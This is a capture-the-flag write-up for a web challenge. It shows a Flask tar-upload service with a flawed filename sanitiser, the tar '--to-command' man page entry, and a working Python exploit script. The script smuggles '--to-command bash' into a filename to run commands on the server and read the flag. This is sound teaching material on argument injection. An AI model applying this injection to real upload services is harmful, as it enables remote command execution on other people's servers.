# Tar Inspector

## Challenge Description

My friend linked me this cool site. He said it's super secure so there's no way you could blindly break in.

## Source Code

```python

# configure app
app.config['UPLOAD_FOLDER'] = UPLOAD_DIR
app.config['MAX_CONTENT_PATH'] = 2 ** 16 # 64 KB

# checks if a file is a .tar file for user feedback reasons
def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# creates a secured version of the filename
def secure_filename(filename):
    # strip extension and any sneaky path traversal stuff
    filename = filename[:-4]
    filename = os.path.basename(filename)
    # escape shell metacharacters
    filename = re.sub("(!|\$|#|&|\"|\'|\(|\)|\||<|>|`|\\\|;)", r"\\\1", filename)
    filename = re.sub("\n", "", filename)
    # add extension
    filename += '__'+hex(randrange(10000000))[2:]+'.tar'
    return filename

@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    print('uploading file...', flush=True)
    if 'file' not in request.files:
        return redirect('/')
        
    f = request.files['file']
    if f.filename == '':
        flash('No selected file!')
        return redirect('/')
        
    if allowed_file(f.filename):
        filename = secure_filename(f.filename)
        f.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        
        command = 'tar xvf {}/{}'.format(app.config['UPLOAD_FOLDER'], filename)
        p = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=EXTRACT_DIR)

        if p.returncode != 0:
            print(p.stderr.decode('ascii'), flush=True)
            flash('Failed to un-tar your archive :(')
            return redirect('/')
        
        listing = [line for line in p.stdout.decode('ascii').split('\n')[:-1]]
        content = tree_from_listing(listing).split('\n')

        return render_template('results.html', content=content, filename=filename)

    else:
        flash('Invalid file extension! Only .tar files allowed.')
        return redirect('/')
```


## $ man tar

```
--to-command=COMMAND
              Pipe extracted files to COMMAND.  The argument is the pathname of an external program, optionally  with  command  line  arguments.
              The  program  will  be invoked and the contents of the file being extracted supplied to it on its standard input.  Additional data
              will be supplied via the following environment variables:
```

## Steps to Exploit

1. Upload a tar file (abcd.tar) containing commands.txt (contains `cat /flag.txt`). Returns new file name (abcd_12d23.tar).
2. Upload another tar file with malicious name `abcd_12d23.tar --to-command bash --exclude .tar`

## Exploit Script

```python
import requests
import re

url = "http://web2.utctf.live:8123"

# Function to upload tar file with payload as name
def send_payload(payload):
    files = {'file': (payload, open('exploit.tar','rb'))}
    r = requests.post(url + "/upload", files=files)
    return r.text

# Upload a file with commands.txt
res = send_payload("sploit13.tar")

# Retrieve the uploaded file name 
filename = re.findall("Filename\:\ (.*?)<\/p>", res)[0]
print("New filename: ", filename)

# Send the exploit file with the retrieved file name
exploit = "%s --to-command bash --exclude .tar" %filename
res = send_payload(exploit)

# Print flag
print("utctf{%s}" %re.findall("utflag{(.*?)}", res)[0])

```